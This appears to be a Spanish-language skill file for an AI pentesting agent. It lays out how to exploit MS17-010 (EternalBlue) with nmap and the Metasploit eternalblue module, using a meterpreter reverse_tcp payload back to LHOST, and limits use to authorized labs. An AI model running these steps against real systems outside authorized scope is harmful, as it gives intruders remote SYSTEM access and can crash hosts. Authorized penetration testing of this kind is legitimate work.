# SKILL-ETERNALBLUE.md — Explotación MS17-010 (EternalBlue)

Fuente: `_src/mukul-anthropic/exploiting-ms17-010-eternalblue-vulnerability/`.

## Cuándo usarla
Host Windows con SMB (445) expuesto y no parcheado de MS17-010 (CVE-2017-0144) dentro de alcance autorizado.

## Procedimiento resumido
1. Verificar servicio/versión: `nmap -p445 --script smb-vuln-ms17-010 <host>`.
2. Escoger módulo: Metasploit `exploit/windows/smb/ms17_010_eternalblue` (payload `windows/x64/meterpreter/reverse_tcp`) o `EternalBlue`/`smbclient` bridges (impacket `ms17_010`).
3. Configurar en msfconsole: `set RHOSTS`, `set PAYLOAD`, `set LHOST`; `run`.
4. Confirmar sesión (L4): `getuid`, `sysinfo`.
5. Persistencia NO (solo pentest ephemeral); documentar y limpiar.
6. Reportar: versión, prueba, impacto (RCE SYSTEM).

## Guardrails
- MS Exploit puede cuzcar BSOD en sistemas con memoria dañada: solo en máquinas de laboratorio/test autorizado; nunca en producción crítica sin aprobación explícita.